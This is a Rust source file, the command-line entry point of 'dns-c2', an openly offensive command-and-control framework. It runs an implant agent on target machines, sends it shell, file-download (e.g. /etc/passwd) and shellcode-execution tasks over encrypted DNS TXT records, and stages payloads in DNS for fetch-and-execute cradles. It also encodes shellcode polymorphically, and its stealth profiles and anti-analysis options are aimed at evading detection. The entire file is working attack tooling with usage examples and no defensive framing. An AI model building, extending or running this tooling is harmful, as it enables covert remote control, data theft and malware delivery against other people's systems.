use dns_c2::agent;
use dns_c2::c2;
use dns_c2::cradle;
use dns_c2::crypto;
use dns_c2::dns;
use dns_c2::encoding;
use dns_c2::traffic;

use clap::{Parser, Subcommand, ValueEnum};
use log::info;
use std::path::PathBuf;

const LONG_ABOUT: &str = "\
dns-c2 — A DNS-native C2 framework.

Cloudflare is the server. DNS is the database. One binary does everything.
All C2 traffic is encrypted ChaCha20-Poly1305 TXT records on your domain.
No VPS, no redirectors, no Docker. Just a Cloudflare free tier account.

OPERATOR QUICK START (local mode, no Cloudflare needed):
  $ export C2_KEY=$(dns-c2 keygen)
  $ dns-c2 sessions -d c2.local -b local
  $ dns-c2 task -d c2.local -b local -k $C2_KEY -s <session> shell whoami

AGENT QUICK START:
  $ dns-c2 agent -d c2.local -b local -k $C2_KEY --interval 5

STAGING (cradle-based delivery):
  $ dns-c2 stage -d stg.example.com -f ./payload.sh -l loader
  $ dns-c2 cradle -s bash -d stg.example.com -l loader

ENCODING (polymorphic shellcode):
  $ dns-c2 encode -f shellcode.bin -o encoded.bin --passes 3";

#[derive(Parser)]
#[command(
    name = "dns-c2",
    version = "0.2.0",
    about = "dns-c2 — DNS-native C2 framework",
    long_about = LONG_ABOUT,
)]
struct Cli {
    #[command(subcommand)]
    command: Commands,
}

#[derive(Clone, ValueEnum)]
enum Backend {
    /// Cloudflare DNS API
    Cloudflare,
    /// DNS-over-HTTPS (reads via DoH, writes via Cloudflare API)
    Doh,
    /// Local JSON file — no network, for development
    Local,
}

#[derive(Parser, Clone)]
struct ConnArgs {
    /// Base domain for DNS records
    #[arg(short, long)]
    domain: String,

    /// DNS backend
    #[arg(short, long, default_value = "cloudflare")]
    backend: Backend,

    /// Cloudflare API token
    #[arg(short, long, env = "C2_CF_TOKEN")]
    token: Option<String>,

    /// Cloudflare Zone ID
    #[arg(short, long, env = "C2_CF_ZONE")]
    zone: Option<String>,

    /// Local JSON store path
    #[arg(long, default_value = "./c2-records.json")]
    store_path: PathBuf,

    /// DoH server URL (for doh backend)
    #[arg(long, env = "C2_DOH_SERVER", default_value = "https://cloudflare-dns.com/dns-query")]
    doh_server: String,
}

#[derive(Subcommand)]
enum Commands {
    /// Run as agent on a target (agent-side)
    ///
    /// Checks in, then polls for tasks, executes them, and returns results.
    /// All communication is encrypted and goes through DNS TXT records.
    ///
    /// Examples:
    ///   dns-c2 agent -d c2.example.com -k $KEY --interval 30 --jitter 0.3
    ///   dns-c2 agent -d c2.example.com -k $KEY --profile stealthy --paranoia 0.3
    Agent {
        #[command(flatten)]
        conn: ConnArgs,

        /// Encryption key (hex-encoded 32 bytes)
        #[arg(short, long, env = "C2_KEY")]
        key: String,

        /// Poll interval in seconds (overridden by --profile if set)
        #[arg(long, default_value_t = 30)]
        interval: u64,

        /// Jitter factor 0.0-1.0 (overridden by --profile if set)
        #[arg(long, default_value_t = 0.3)]
        jitter: f64,

        /// Jitter strategy (linear, exponential, adaptive, bursty)
        #[arg(long, default_value = "linear")]
        jitter_strategy: String,

        /// Override auto-generated session ID
        #[arg(long)]
        session_id: Option<String>,

        /// Traffic shaping profile: aggressive, default, stealthy, paranoid
        #[arg(long)]
        profile: Option<String>,

        /// Anti-analysis paranoia threshold 0.0-1.0 (0.0=disabled, 0.3=moderate)
        #[arg(long, default_value_t = 0.0)]
        paranoia: f64,
    },

    /// List active sessions (operator-side)
    ///
    /// Shows all agents that have checked in, with host info and last-seen time.
    ///
    /// Example:
    ///   dns-c2 sessions -d c2.example.com -k $KEY
    Sessions {
        #[command(flatten)]
        conn: ConnArgs,

        /// Encryption key
        #[arg(short, long, env = "C2_KEY")]
        key: String,
    },

    /// Send a task to an agent (operator-side)
    ///
    /// Sends a command and waits for the response (or use --no-wait).
    ///
    /// Available commands: shell, ls, cat, pwd, whoami, ps, env,
    ///                     download, upload, id, hostname, netstat,
    ///                     sysinfo, execute-shellcode, exit
    ///
    /// Examples:
    ///   dns-c2 task -d c2.example.com -k $KEY -s abc123 shell whoami
    ///   dns-c2 task -d c2.example.com -k $KEY -s abc123 ls /etc
    ///   dns-c2 task -d c2.example.com -k $KEY -s abc123 download /etc/passwd
    ///   dns-c2 task -d c2.example.com -k $KEY -s abc123 sysinfo
    ///   dns-c2 task ... -s abc123 execute-shellcode <base64_shellcode>
    Task {
        #[command(flatten)]
        conn: ConnArgs,

        /// Encryption key
        #[arg(short, long, env = "C2_KEY")]
        key: String,

        /// Target session ID
        #[arg(short, long)]
        session: String,

        /// Command to execute
        command: String,

        /// Command arguments
        args: Vec<String>,

        /// Don't wait for response
        #[arg(long, default_value_t = false)]
        no_wait: bool,

        /// Response timeout in seconds
        #[arg(long, default_value_t = 120)]
        timeout: u64,
    },

    /// Read a task response by ID (operator-side)
    ///
    /// Example:
    ///   dns-c2 result -d c2.example.com -k $KEY -s abc123 -t taskid
    Result {
        #[command(flatten)]
        conn: ConnArgs,

        /// Encryption key
        #[arg(short, long, env = "C2_KEY")]
        key: String,

        /// Session ID
        #[arg(short, long)]
        session: String,

        /// Task ID
        #[arg(short = 'i', long)]
        task_id: String,
    },

    /// Generate a new 256-bit encryption key
    Keygen,

    /// Stage a payload into DNS for cradle-based delivery
    ///
    /// By default staged payloads are plain base64 (for native tool compatibility).
    /// Use --encrypt to encrypt with ChaCha20-Poly1305 (requires agent-side key).
    ///
    /// Example:
    ///   dns-c2 stage -d stg.example.com -f ./payload.sh -l loader
    ///   dns-c2 stage -d stg.example.com -f ./payload.sh -l loader --encrypt -k $KEY
    Stage {
        #[command(flatten)]
        conn: ConnArgs,

        /// Local file to stage
        #[arg(short, long)]
        file: PathBuf,

        /// Label for the staged payload
        #[arg(short, long)]
        label: String,

        /// Payload type (auto-detected if omitted: script, elf, pe, shellcode)
        #[arg(long, value_name = "TYPE")]
        r#type: Option<String>,

        /// Encrypt the staged payload (requires -k)
        #[arg(long, default_value_t = false)]
        encrypt: bool,

        /// Encryption key (required if --encrypt is set)
        #[arg(short, long, env = "C2_KEY")]
        key: Option<String>,
    },

    /// Generate a cradle one-liner to fetch and execute a staged payload
    ///
    /// Example:
    ///   dns-c2 cradle -s bash -d stg.example.com -l loader -n 1.1.1.1
    Cradle {
        #[command(flatten)]
        conn: ConnArgs,

        /// Target shell (bash, pwsh, cmd)
        #[arg(short, long)]
        shell: String,

        /// Label of the staged payload
        #[arg(short, long)]
        label: String,

        /// DNS server for the cradle to query
        #[arg(short, long)]
        ns: Option<String>,
    },

    /// Remove a staged payload from DNS
    Unstage {
        #[command(flatten)]
        conn: ConnArgs,

        /// Label to remove
        #[arg(short, long)]
        label: String,
    },

    /// Encode a payload with polymorphic XOR encoding (SGN-style)
    ///
    /// Produces different output each run, even for identical input.
    /// The encoded payload is self-contained (includes decoder metadata).
    ///
    /// Example:
    ///   dns-c2 encode -f shellcode.bin -o encoded.bin --passes 3
    Encode {
        /// Input file
        #[arg(short, long)]
        file: PathBuf,

        /// Output file
        #[arg(short, long)]
        output: PathBuf,

        /// Number of encoding passes (more = more obfuscation)
        #[arg(long, default_value_t = 3)]
        passes: usize,

        /// Pad output to this size (bytes) for traffic analysis resistance
        #[arg(long)]
        pad_to: Option<usize>,
    },

    /// Decode a polymorphic-encoded payload
    ///
    /// Example:
    ///   dns-c2 decode -f encoded.bin -o decoded.bin
    Decode {
        /// Input file (encoded)
        #[arg(short, long)]
        file: PathBuf,

        /// Output file (decoded)
        #[arg(short, long)]
        output: PathBuf,

        /// Input is padded (unpad before decoding)
        #[arg(long, default_value_t = false)]
        padded: bool,
    },
}

fn make_backend(conn: &ConnArgs) -> Box<dyn dns::DnsBackend> {
    match conn.backend {
        Backend::Cloudflare => {
            let token = conn
                .token
                .clone()
                .expect("Cloudflare backend requires --token or C2_CF_TOKEN");
            let zone = conn
                .zone
                .clone()
                .expect("Cloudflare backend requires --zone or C2_CF_ZONE");
            let retry = dns::retry::RetryBackend::with_defaults(Box::new(
                dns::cloudflare::CloudflareBackend::new(token, zone),
            ));
            Box::new(retry)
        }
        Backend::Doh => {
            let token = conn
                .token
                .clone()
                .expect("DoH backend requires --token or C2_CF_TOKEN (for writes)");
            let zone = conn
                .zone
                .clone()
                .expect("DoH backend requires --zone or C2_CF_ZONE (for writes)");
            let doh = dns::doh::DoHBackend::new(
                conn.doh_server.clone(),
                token,
                zone,
            );
            let retry = dns::retry::RetryBackend::with_defaults(Box::new(doh));
            Box::new(retry)
        }
        Backend::Local => {
            info!("Using local backend: {:?}", conn.store_path);
            Box::new(dns::local::LocalFileBackend::new(conn.store_path.clone()))
        }
    }
}

fn main() {
    env_logger::Builder::from_env(env_logger::Env::default().default_filter_or("warn")).init();

    let cli = Cli::parse();

    match cli.command {
        // ─── C2 Agent ───
        Commands::Agent {
            conn,
            key,
            interval,
            jitter,
            jitter_strategy,
            session_id,
            profile,
            paranoia,
        } => {
            let master_key = crypto::key_from_hex(&key).expect("Invalid key");
            let session = session_id.unwrap_or_else(c2::generate_session_id);
            let backend = make_backend(&conn);
            let rt = tokio::runtime::Runtime::new().unwrap();

            let strategy = jitter_strategy
                .parse::<agent::JitterStrategy>()
                .unwrap_or_else(|e| {
                    eprintln!("{e}");
                    std::process::exit(1);
                });

            // Build traffic profile from --profile flag or fall back to manual interval/jitter
            let traffic_profile = if let Some(ref p) = profile {
                p.parse::<agent::ProfilePreset>()
                    .unwrap_or_else(|e| { eprintln!("{e}"); std::process::exit(1); })
                    .to_traffic_profile()
            } else {
                traffic::shaping::TrafficProfile {
                    base_interval_secs: interval as f64,
                    jitter: traffic::shaping::JitterType::Uniform {
                        range_secs: interval as f64 * jitter.clamp(0.0, 1.0),
                    },
                    ..traffic::shaping::TrafficProfile::default()
                }
            };

            let profile_name = profile.as_deref().unwrap_or("custom");

            let config = agent::AgentConfig {
                domain: conn.domain,
                key: master_key,
                session_id: session.clone(),
                poll_interval_secs: interval,
                jitter_pct: jitter.clamp(0.0, 1.0),
                jitter_strategy: strategy,
                paranoia: paranoia.clamp(0.0, 1.0),
                traffic_profile,
                encode_c2: profile.is_some(),
            };

            eprintln!("dns-c2 agent | session={} profile={} paranoia={:.0}%",
                session, profile_name, paranoia * 100.0);

            rt.block_on(async {
                if let Err(e) = agent::run(backend.as_ref(), &config).await {
                    eprintln!("Agent error: {e}");
                    std::process::exit(1);
                }
            });
        }

        // ─── List Sessions ───
        Commands::Sessions { conn, key } => {
            let master_key = crypto::key_from_hex(&key).expect("Invalid key");
            let backend = make_backend(&conn);
            let rt = tokio::runtime::Runtime::new().unwrap();

            rt.block_on(async {
                match c2::list_sessions(backend.as_ref(), &conn.domain, &master_key).await {
                    Ok(sessions) => {
                        if sessions.is_empty() {
                            eprintln!("No active sessions");
                        } else {
                            eprintln!("{} session(s):\n", sessions.len());
                            for s in &sessions {
                                println!("{s}");
                            }
                        }
                    }
                    Err(e) => {
                        eprintln!("Error: {e}");
                        std::process::exit(1);
                    }
                }
            });
        }

        // ─── Send Task ───
        Commands::Task {
            conn,
            key,
            session,
            command,
            args,
            no_wait,
            timeout,
        } => {
            let master_key = crypto::key_from_hex(&key).expect("Invalid key");
            let backend = make_backend(&conn);
            let rt = tokio::runtime::Runtime::new().unwrap();

            let task_id = c2::generate_task_id();
            let task = c2::Task {
                task_id: task_id.clone(),
                command: command.clone(),
                args: args.clone(),
                timestamp: std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .unwrap()
                    .as_secs(),
            };

            rt.block_on(async {
                if let Err(e) = c2::send_task(
                    backend.as_ref(),
                    &conn.domain,
                    &master_key,
                    &session,
                    &task,
                )
                .await
                {
                    eprintln!("Failed to send task: {e}");
                    std::process::exit(1);
                }
                eprintln!(
                    "Sent: {} {} → session {} [task={}]",
                    command,
                    args.join(" "),
                    session,
                    task_id
                );

                if no_wait {
                    println!("task_id={task_id}");
                    return;
                }

                eprintln!("Waiting for response (timeout={}s)...", timeout);
                match c2::wait_for_response(
                    backend.as_ref(),
                    &conn.domain,
                    &master_key,
                    &session,
                    &task_id,
                    timeout,
                )
                .await
                {
                    Ok(resp) => {
                        eprintln!("[{}] task={}", resp.status, resp.task_id);
                        println!("{}", resp.output);
                    }
                    Err(e) => {
                        eprintln!("Error: {e}");
                        std::process::exit(1);
                    }
                }
            });
        }

        // ─── Read Result ───
        Commands::Result {
            conn,
            key,
            session,
            task_id,
        } => {
            let master_key = crypto::key_from_hex(&key).expect("Invalid key");
            let backend = make_backend(&conn);
            let rt = tokio::runtime::Runtime::new().unwrap();

            rt.block_on(async {
                match c2::read_response(
                    backend.as_ref(),
                    &conn.domain,
                    &master_key,
                    &session,
                    &task_id,
                )
                .await
                {
                    Ok(Some(resp)) => {
                        eprintln!("[{}] task={}", resp.status, resp.task_id);
                        println!("{}", resp.output);
                    }
                    Ok(None) => {
                        eprintln!("No response yet for task {task_id}");
                        std::process::exit(1);
                    }
                    Err(e) => {
                        eprintln!("Error: {e}");
                        std::process::exit(1);
                    }
                }
            });
        }

        // ─── Keygen ───
        Commands::Keygen => {
            let key = crypto::generate_key();
            println!("{}", hex::encode(key));
        }

        // ─── Stage ───
        Commands::Stage {
            conn,
            file,
            label,
            r#type,
            encrypt,
            key,
        } => {
            let data = std::fs::read(&file).unwrap_or_else(|e| {
                eprintln!("Failed to read {}: {e}", file.display());
                std::process::exit(1);
            });

            let payload_type = r#type.map(|t| {
                t.parse::<cradle::PayloadType>().unwrap_or_else(|e| {
                    eprintln!("Invalid type: {e}");
                    std::process::exit(1);
                })
            });

            let enc_key = if encrypt {
                let k = key.as_ref().unwrap_or_else(|| {
                    eprintln!("--encrypt requires --key or C2_KEY");
                    std::process::exit(1);
                });
                Some(crypto::key_from_hex(k).unwrap_or_else(|e| {
                    eprintln!("Invalid key: {e}");
                    std::process::exit(1);
                }))
            } else {
                None
            };

            let backend = make_backend(&conn);
            let rt = tokio::runtime::Runtime::new().unwrap();

            eprintln!(
                "Staging {} ({} bytes) as '{}'{} ...",
                file.display(),
                data.len(),
                label,
                if encrypt { " [encrypted]" } else { "" }
            );
            rt.block_on(async {
                match cradle::stage_payload(
                    backend.as_ref(),
                    &conn.domain,
                    &label,
                    &data,
                    payload_type,
                    encrypt,
                    enc_key.as_ref(),
                )
                .await
                {
                    Ok(meta) => {
                        eprintln!(
                            "Staged: {} chunks, type={}, hash={}, encrypted={}",
                            meta.chunks, meta.payload_type, meta.hash, meta.encrypted
                        );
                        eprintln!("\nGenerate cradles:");
                        eprintln!(
                            "  dns-c2 cradle -s bash -d {} -l {}",
                            conn.domain, label
                        );
                        eprintln!(
                            "  dns-c2 cradle -s pwsh -d {} -l {}",
                            conn.domain, label
                        );
                    }
                    Err(e) => {
                        eprintln!("Stage failed: {e}");
                        std::process::exit(1);
                    }
                }
            });
        }

        // ─── Cradle ───
        Commands::Cradle {
            conn,
            shell,
            label,
            ns,
        } => {
            let shell_type = shell.parse::<cradle::Shell>().unwrap_or_else(|e| {
                eprintln!("{e}");
                std::process::exit(1);
            });

            let backend = make_backend(&conn);
            let rt = tokio::runtime::Runtime::new().unwrap();

            let meta = rt
                .block_on(async {
                    cradle::read_stage_meta(backend.as_ref(), &conn.domain, &label).await
                })
                .unwrap_or_else(|e| {
                    eprintln!("Failed to read metadata: {e}");
                    std::process::exit(1);
                });

            if meta.encrypted {
                eprintln!("WARNING: Payload is encrypted — native cradle will fetch ciphertext.");
                eprintln!("Agent-side decryption is required.");
            }

            println!(
                "{}",
                cradle::generate_cradle(shell_type, &conn.domain, &label, &meta, ns.as_deref())
            );
        }

        // ─── Unstage ───
        Commands::Unstage { conn, label } => {
            let backend = make_backend(&conn);
            let rt = tokio::runtime::Runtime::new().unwrap();

            rt.block_on(async {
                match cradle::unstage_payload(backend.as_ref(), &conn.domain, &label).await {
                    Ok(count) => eprintln!("Deleted {count} records"),
                    Err(e) => {
                        eprintln!("Unstage failed: {e}");
                        std::process::exit(1);
                    }
                }
            });
        }

        // ─── Encode ───
        Commands::Encode {
            file,
            output,
            passes,
            pad_to,
        } => {
            let data = std::fs::read(&file).unwrap_or_else(|e| {
                eprintln!("Failed to read {}: {e}", file.display());
                std::process::exit(1);
            });

            let mut encoded = encoding::encode_payload(&data, passes);

            if let Some(target_size) = pad_to {
                encoded = encoding::pad_to_size(&encoded, target_size);
            }

            std::fs::write(&output, &encoded).unwrap_or_else(|e| {
                eprintln!("Failed to write {}: {e}", output.display());
                std::process::exit(1);
            });

            eprintln!(
                "Encoded {} → {} ({} bytes → {} bytes, {} passes)",
                file.display(),
                output.display(),
                data.len(),
                encoded.len(),
                passes
            );
        }

        // ─── Decode ───
        Commands::Decode {
            file,
            output,
            padded,
        } => {
            let data = std::fs::read(&file).unwrap_or_else(|e| {
                eprintln!("Failed to read {}: {e}", file.display());
                std::process::exit(1);
            });

            let payload = if padded {
                encoding::unpad(&data).unwrap_or_else(|| {
                    eprintln!("Failed to unpad data");
                    std::process::exit(1);
                })
            } else {
                data
            };

            let decoded = encoding::decode_payload(&payload).unwrap_or_else(|| {
                eprintln!("Failed to decode payload (invalid format)");
                std::process::exit(1);
            });

            std::fs::write(&output, &decoded).unwrap_or_else(|e| {
                eprintln!("Failed to write {}: {e}", output.display());
                std::process::exit(1);
            });

            eprintln!(
                "Decoded {} → {} ({} bytes)",
                file.display(),
                output.display(),
                decoded.len()
            );
        }
    }
}
